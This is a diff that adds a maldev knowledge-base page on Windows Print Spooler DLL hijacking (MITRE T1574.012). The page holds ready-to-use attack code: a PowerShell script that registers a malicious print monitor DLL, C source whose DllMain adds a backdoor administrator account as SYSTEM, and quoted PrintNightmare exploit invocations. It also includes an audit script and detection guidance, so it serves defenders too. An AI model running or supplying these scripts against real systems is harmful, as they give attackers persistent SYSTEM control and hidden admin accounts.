@@ -1,0 +1,217 @@
+---
+title: Print Spooler DLL Hijacking
+mitre: T1574.012
+category: persistence
+group: Hijack Execution Flow
+summary: Exploit the Windows Print Spooler service's dynamic loading of print provider and monitor DLLs to achieve persistence or privilege escalation.
+platform: [Windows]
+tags: ['C / C++', 'PowerShell', 'WinAPI', 'DLL']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: identify a print provider or monitor DLL path
+    desc: The Spooler reads provider DLL names from HKLM\SYSTEM\CurrentControlSet\Control\Print\Providers and Monitors registry keys.
+    dll: —
+  - call: drop a malicious DLL at the registered path
+    desc: Write the payload DLL to the path the spooler will load — often a System32 subdirectory writable by admins.
+    dll: —
+  - call: restart the Print Spooler service (or wait for reboot)
+    desc: spoolsv.exe reloads provider DLLs on service start; the malicious DLL executes in the SYSTEM context of the Spooler.
+    dll: —
+  - call: DllMain runs payload in SYSTEM context
+    desc: The Spooler loads the DLL as SYSTEM; no privilege escalation required beyond the ability to write the DLL and modify the registry.
+    dll: spoolsv
+detections:
+  - src: SYSMON EID 7
+    text: spoolsv.exe loading an unsigned DLL or a DLL from a non-standard path.
+  - src: SYSMON EID 12/13
+    text: Registry modification under HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors or Providers by a non-admin or unexpected process.
+  - src: SYSMON EID 11
+    text: New DLL file created in System32 subdirectory by a process that is not the Windows Installer or a known updater.
+  - src: WINDOWS EID 7036
+    text: Spooler service restart events correlated with new DLL load events (EID 7045 or Sysmon EID 7).
+related:
+  - mitre: T1574.001
+    title: DLL Hijacking
+    desc: General DLL search order hijacking — Print Spooler is a specific, high-value target.
+    href: /techniques/persistence/dll-hijacking
+  - mitre: T1574.002
+    title: DLL Side-Loading
+    desc: Drop a malicious DLL beside a signed application that loads it by name.
+    href: /techniques/injection/dll-sideloading
+  - mitre: T1543.003
+    title: Service Creation
+    desc: Creating a new service achieves similar SYSTEM-level persistence with a different mechanism.
+    href: /techniques/persistence/service-creation
+labKit:
+  - label: print-provider-persist.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+The Windows **Print Spooler** (`spoolsv.exe`) runs as SYSTEM and loads third-party DLLs for print providers and port monitors — two extension points that allow vendors to add custom printing backends. These DLLs are registered in the registry and loaded dynamically when the Spooler starts. An adversary with Administrator rights can register a malicious DLL as a print monitor, achieving **persistent SYSTEM-level code execution** that restarts with the Spooler on every boot.
+
+This technique was most prominently seen in the wild through PrintNightmare (CVE-2021-1675) variants, which abused the `AddPrinterDriver` API to install malicious printer drivers that get loaded into the Spooler process. The registry-based persistence variant (without an exploit) requires admin rights but is simpler and more stable.
+
+<Callout type="note">
+  The PrintNightmare vulnerability (CVE-2021-1675 and CVE-2021-34527) specifically abused the
+  print driver installation mechanism, not just the registry-based approach described here.
+  Microsoft patched the specific CVEs but the print monitor registry persistence path remains
+  a valid post-exploitation persistence mechanism for admin-level attackers. Microsoft
+  recommends disabling the Print Spooler on domain controllers and servers where printing
+  is not needed.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Register a malicious print monitor via registry
+
+<CodeBlock
+  file="print_monitor_persist.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Requires Administrator
+# The Spooler loads all DLLs listed under HKLM\...\Print\Monitors at service start
+
+$monitor_key = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor"
+$dll_name    = "evil_monitor.dll"
+
+# The DLL must be in System32 (the Spooler uses System32 as its working directory)
+Copy-Item C:\\Temp\\payload.dll "C:\\Windows\\System32\\$dll_name"
+
+# Register the monitor — Spooler loads this DLL at next start
+New-Item -Path $monitor_key -Force | Out-Null
+New-ItemProperty -Path $monitor_key -Name "Driver" -Value $dll_name -PropertyType String | Out-Null
+
+Write-Host "[+] Print monitor registered: $dll_name"
+Write-Host "[*] Restart the Spooler to trigger:"
+Write-Host "    Restart-Service Spooler"`}
+/>
+
+### Print monitor DLL (SYSTEM execution at Spooler load)
+
+<CodeBlock
+  file="evil_monitor.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+
+// The Spooler loads this DLL and calls InitializePrintMonitor2
+// (or InitializePrintMonitor for the older API).
+// DllMain runs first — we execute our payload here.
+
+static DWORD WINAPI payload_thread(LPVOID) {
+    // Running as SYSTEM inside spoolsv.exe
+    // Example: add a backdoor local admin account
+    system("net user backdoor P@ssw0rd123! /add");
+    system("net localgroup administrators backdoor /add");
+    return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hDll);
+        // Launch payload in a new thread to avoid blocking the Spooler
+        HANDLE t = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
+        if (t) CloseHandle(t);
+    }
+    return TRUE;
+}
+
+// The Spooler expects a valid monitor export — provide a stub
+// so the DLL loads successfully even if it queries the API.
+__declspec(dllexport) LPMONITOR2 WINAPI InitializePrintMonitor2(
+    PMONITORINIT pMonitorInit, PHANDLE phMonitor) {
+    *phMonitor = NULL;
+    return NULL;  // returning NULL fails gracefully; Spooler continues loading
+}`}
+/>
+
+### Enumerate registered print monitors (auditing)
+
+<CodeBlock
+  file="audit_monitors.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# List all registered print monitors and their DLL paths
+# Look for unsigned DLLs or DLLs with unexpected paths
+
+$monitors_key = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors"
+$providers_key = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Providers"
+
+Write-Host "=== Print Monitors ==="
+Get-ChildItem $monitors_key | ForEach-Object {
+    $dll = (Get-ItemProperty $_.PSPath).Driver
+    if ($dll) {
+        $full_path = Join-Path "C:\\Windows\\System32" $dll
+        $sig = Get-AuthenticodeSignature $full_path -ErrorAction SilentlyContinue
+        [PSCustomObject]@{
+            Monitor  = $_.PSChildName
+            DLL      = $dll
+            Signed   = $sig.Status
+            Publisher = $sig.SignerCertificate.Subject
+        }
+    }
+} | Format-Table -AutoSize
+
+Write-Host "=== Print Providers ==="
+Get-ChildItem $providers_key | ForEach-Object {
+    $dll = (Get-ItemProperty $_.PSPath).Name
+    Write-Host "$($_.PSChildName): $dll"
+}`}
+/>
+
+## Alternative: AddPrinterDriver API (PrintNightmare technique)
+
+<CodeBlock
+  file="add_driver.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Use the legitimate AddPrinterDriver Win32 API to install a malicious print driver.
+# This was the PrintNightmare (CVE-2021-1675) attack path.
+# Patched by Microsoft — requires Point and Print restrictions to be disabled.
+# Shown for historical/educational reference only.
+
+# The driver DLL is loaded into spoolsv.exe as SYSTEM.
+# Invoke-Nightmare PoC (Caleb Stewart / John Hammond):
+# Import-Module .\CVE-2021-1675.ps1
+# Invoke-Nightmare -NewUser "user1" -NewPassword "Passw0rd!" -DriverName "PrintMe"
+
+# Modern patched systems require:
+# - SeLoadDriverPrivilege
+# - Print driver to be signed by a trusted CA
+# - NoAddPrinterDrivers policy = 0 (disabled)
+
+Write-Host "Note: CVE-2021-1675 / CVE-2021-34527 patched in July 2021 (KB5004945 and later)"
+Write-Host "Registry persistence via print monitors remains effective post-patch with admin rights"`}
+/>
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most reliable detection is monitoring for unsigned DLLs loaded by `spoolsv.exe` (Sysmon EID 7 with `Signed: false` and `Image: spoolsv.exe`). Legitimate print monitor DLLs from Microsoft or major printer vendors are signed. Any unsigned DLL loaded into the Spooler process is a high-confidence indicator of abuse.
+
+Complementary control: disable the Print Spooler service on all systems where printing is not required (domain controllers, most servers). This eliminates the entire attack surface.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
